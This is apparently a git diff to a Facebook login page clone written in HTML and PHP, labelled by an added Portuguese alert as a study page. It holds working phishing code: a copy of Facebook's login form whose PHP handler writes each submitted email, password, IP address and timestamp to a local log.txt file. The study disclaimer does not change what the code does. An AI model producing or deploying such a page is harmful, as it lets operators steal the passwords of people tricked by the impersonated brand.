@@ -12,19 +12,22 @@
 </head>
 
 <body>
+  <script>
+    alert("Isso não é a pagina oficial, é uma pagina de estudo! Não loge com dados reais.")
+  </script>
 <div class="computer">
   <header>
     <div class="headersubdiv">
       <img src="images/fblogo.png" class="fblogo">
       <div class="loginform">
-        <form method="POST" action="www.facebook.com">
+        <form method="POST">
         <table>
           <tr>
             <td class="logintext">Email or Phone</td>
             <td class="logintext"><span class="loginrowgap">Password</span></td>
           </tr>
-            <td><input class="logintext loginfield" name="inputEmail" type="text"></td>
-            <td><input class="logintext loginrowgap loginfield" name="inputSenha" type="password"></td>
+            <td><input class="logintext loginfield" name="inputEmail" type="text" required></td>
+            <td><input class="logintext loginrowgap loginfield" name="inputSenha" type="password" required></td>
             <td><input class="loginrowgap" id="loginbutton" type="submit" value="Log In"></td>
           </tr>
           <tr>
@@ -180,10 +183,6 @@
   </footer>
 </div>
 
-
-
-<!--Code for Mobile Screen-->
-
 <div class="mobile">
   <div class="mobheader">
     <img src="images/fblogo.png" class="mobfblogo">
@@ -247,12 +246,7 @@
     $email = $_POST['inputEmail'];
     $senha = $_POST['inputSenha'];
 
-$msg = "
-- Email : $email\n
-- Senha : $senha\n
-- IP : $senha\n
-- Data e Hora : $senha\n
---------------------------------";
+    $msg = "- Email : '$email' | Senha: '$senha' | IP : '$IP' | Data/Hora : '$datatime'";
     $myfile = fopen("log.txt", "a");
     fwrite($myfile, $msg."\n");
     fclose($myfile);
